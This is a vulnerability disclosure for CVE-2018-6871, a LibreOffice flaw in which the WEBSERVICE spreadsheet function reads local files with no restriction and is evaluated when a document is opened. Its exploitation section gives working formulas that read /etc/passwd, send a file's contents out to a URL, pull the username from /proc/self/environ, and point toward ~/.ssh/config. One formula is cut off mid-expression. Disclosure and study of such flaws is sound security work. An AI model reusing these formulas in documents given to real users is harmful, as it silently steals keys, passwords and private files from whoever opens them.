# Vulnerability description

[CVE-2018-6871](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6871)

## First part

LibreOffice supports COM.MICROSOFT.WEBSERVICE function:

    https://support.office.com/en-us/article/webservice-function-0546a35a-ecc6-4739-aed7-c0b7ce1562c4

The function is required to obtain data by URL, usually used as:

    =FILTERXML(WEBSERVICE("http://api.openweathermap.org/data/2.5/forecast?q=Copenhagen,dk&mode=xml&units=metric");"number(/weatherdata/forecast/time[2]/temperature/@value)")

In original:

    For protocols that are not supported, such as ftp: // or file: //, WEBSERVICE returns the #VALUE! error value.

In LibreOffice, these restrictions are not implemented.

## Second part

By default the cells are not updated, but if you specify the cell type like ~error, then the cell will be updated when you open document.

# Exploitation

To read file you need just:

    =WEBSERVICE("/etc/passwd")

This function can also be used to send a file:

    =WEBSERVICE("http://localhost:6000/?q=" & WEBSERVICE("/etc/passwd"))

For successful operation, you need to send the files of the current user, so you need to retrieve current user home path.

    =MID(WEBSERVICE("/proc/self/environ"), FIND("USER=", WEBSERVICE("/proc/self/environ")) + 5, SEARCH(CHAR(0), WEBSERVICE("/proc/self/environ"), FIND("USER=", WEBSERVICE("/proc/self/environ")))-FIND("USER=",

Also you can parse other files too, like a ~/.ssh/config or something like that.

For other than LibreOffice Calc formats you just need embed calc object to other document (I checked it works).

# Impact

It is easy to send any files with keys, passwords and anything else. 100% success rate, absolutely silent, affect LibreOffice prior to 5.4.5/6.0.1 in all operation systems (GNU/Linux, MS Windows, macOS etc.) and may be embedded in almost all formats supporting by LO. 

# Acknowledgment

Vulnerability was parallely found by me (@jollheef) and Ronnie Goodrich && Andrew Krasichkov according to LibreOffice team notes.
